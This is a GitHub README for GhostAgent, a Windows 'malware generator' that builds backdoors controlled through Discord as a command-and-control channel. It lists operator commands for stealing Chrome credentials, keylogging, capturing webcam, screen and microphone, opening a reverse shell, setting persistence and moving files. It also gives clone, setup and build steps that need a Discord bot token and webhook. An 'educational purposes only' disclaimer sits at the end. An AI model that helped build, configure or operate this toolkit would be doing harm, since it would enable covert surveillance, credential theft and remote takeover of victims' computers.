<h1 align="center">
  <br>
  <a href=""><img src="img/GhostAgent.jpeg" width=300 height=300 alt="GhostAgent"></a>
  <br>
  GhostAgent
  <br>
</h1>

<h4 align="center">GhostAgent Command and Control</h4>

<p align="center">
    <img src="https://img.shields.io/badge/Support-Windows-blue">
    <img src="https://img.shields.io/badge/Version-1.0.5-blue">
    <img src="https://img.shields.io/badge/Python-3.8.9-blue">
    <img src="https://img.shields.io/github/stars/x6h057/GhostAgent?style=social">
    <img src="https://img.shields.io/github/forks/x6h057/GhostAgent?style=social">
</p>

---

## ℹ️ Info  

**GhostAgent** is a sophisticated **malware generator** designed to create backdoors that leverage the **Discord platform as a Command and Control (C2) server**.  
It operates discreetly by establishing a hidden configuration directory: ```C:\Users\%USERPROFILE%\.config```.
<br>This directory is used to store various artifacts, including:  
- Uploaded files and directories  
- Microphone recordings  
- Agent identifiers  
- Other operational data  

## ⚙️ How does it work?
GhostAgent leverages libraries to enable an agent to act as a **Discord bot**. Attackers communicate with the bot to execute malicious commands on the target system.

## 🚀 Features
✅ Encrypted Traffic (**HTTPS**)
<br>
✅ Customizable Configuration Settings
<br>
✅ Support for Multiple Online Agents


## ❓ Help Menu

- **`/help`**: Shows the menu.
- **`/interact <id>`**: Interact with a specific agent.
- **`/background`**: Background your current agent.
- **`/cmd <command>`**: Run command on target.
- **`/cmd-all <command>`**: Run a command on all agents.
- **`/cd <path>`**: Change current directory.
- **`/webshot`**: Grab a picture from the webcam.
- **`/processes`**: Get a list of all running processes.
- **`/upload <url>`**: Upload file to agent.
- **`/screenshot`**: Grab a screenshot from the agent.
- **`/creds`**: Get chrome saved credentials.
- **`/persistence`**: Enable persistence.
- **`/list`**: Get a list of all active agents.
- **`/download <path>`**: Download file from agent.
- **`/terminate`**: Terminate the session.
- **`/location`**: Get the location of the target machine.
- **`/revshell <ip> <port>`**: Get a reverse shell on the target machine.
- **`/recordmic <interval>`**: Record the microphone of the target machine.
- **`/wallpaper <path/url>`**: Change the wallpaper of the target machine.
- **`/killproc <pid>`**: Kill a process on the target machine.
- **`/keylog <mode> <interval>`**: Start/Stop the keylog on the target machine.
- **`/purge`**: Delete the agent and the reg keys.


## 📥 Installation
### Linux
```bash
git clone https://github.com/x6h057/GhostAgent.git
cd ./GhostAgent
```

## 🔧 Setup
```bash
sudo su
chmod +x setup.sh
./setup.sh
```

## 📌 Usage
```bash
sudo su  # Run as root always.
python3 builder.py

set name <agent-name>
set server <server id from discord>
set token <discord bot token>
set channel <channel id from discord server>
set webhook <discord webhook>
set custom config
build
```

## 👥 Contributors
🔹 Credits: This project is inspired by the amazing open-source [Dystopia](https://github.com/3ct0s/dystopia-c2.git).  
🔹 Feel free to open **issues** and **pull requests** to contribute! Bug reports, feature suggestions, and improvements are welcome.

## ⚠️ Disclaimer
> **This repository is intended for educational purposes only.** The developer assumes **no responsibility** for misuse. **Unauthorized or illegal use is strictly prohibited.** Ensure compliance with all applicable laws before using this software.

---
<p align="center">⭐ If you like this project, consider starring it on GitHub!</p>

